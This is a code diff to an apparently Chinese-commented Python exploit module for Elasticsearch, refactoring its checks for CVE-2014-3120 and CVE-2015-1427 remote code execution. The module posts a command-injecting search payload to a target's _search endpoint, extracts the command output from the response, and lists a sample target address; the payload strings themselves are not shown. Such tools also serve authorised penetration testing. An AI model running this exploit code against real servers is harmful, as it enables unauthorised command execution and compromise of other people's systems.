@@ -1,19 +1,16 @@
 import random,string,requests,json,re
-from ClassCongregation import _urlparse
+from ClassCongregation import _urlparse,PocType_,verify
 from requests_toolbelt.utils import dump
 from operator import methodcaller
 from urllib.parse import urlparse, quote
-import CodeTest
 ################
 ##--ApacheSolr--##
 #cve_2014_3120 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
 #cve_2015_1427 
 ################
-#echo VuLnEcHoPoCSuCCeSS
-#VULN = None => 漏洞测试
-#VULN = True => 命令执行
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 class Elasticsearch():
     def __init__(self, url, CMD):
         # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
@@ -47,7 +44,7 @@ class Elasticsearch():
         self.pocname = "Elasticsearch: CVE-2014-3120"
         self.method = "post"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.data_send_info = r'''{ "name": "cve-2014-3120" }'''
         self.data_rce = self.payload_cve_2014_3120.replace("RECOMMAND", self.CMD)
         try:
@@ -55,19 +52,19 @@ class Elasticsearch():
             self.request = requests.post(self.url+"/_search?pretty", data=self.data_rce, headers=self.headers, timeout=TIMEOUT, verify=False)
             self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["command"][0]
             self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_2015_1427(self):
         self.pocname = "Elasticsearch: CVE-2015-1427"
         self.method = "post"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.data_send_info = r'''{ "name": "cve-2015-1427" }'''
         self.data_rce = self.payload_cve_2015_1427.replace("RECOMMAND", self.CMD)
         self.host = self.hostname + ":" + str(self.port)
@@ -86,13 +83,13 @@ class Elasticsearch():
                                      timeout=TIMEOUT, verify=False)
             self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["lupin"][0]
             self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 print("""eg: http://106.53.249.95:8983
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
@@ -102,15 +99,7 @@ print("""eg: http://106.53.249.95:8983
 | Elasticsearch     | cve_2015_1427    |  Y  |  Y  | 1.4.0 < 1.4.3, elasticsearch remote code execution          |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpElasticsearch = Elasticsearch(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpElasticsearch = Elasticsearch(_urlparse(kwargs['url']),kwargs['cmd'])
+    ExpElasticsearch = Elasticsearch(_urlparse(kwargs['url']), CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpElasticsearch, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
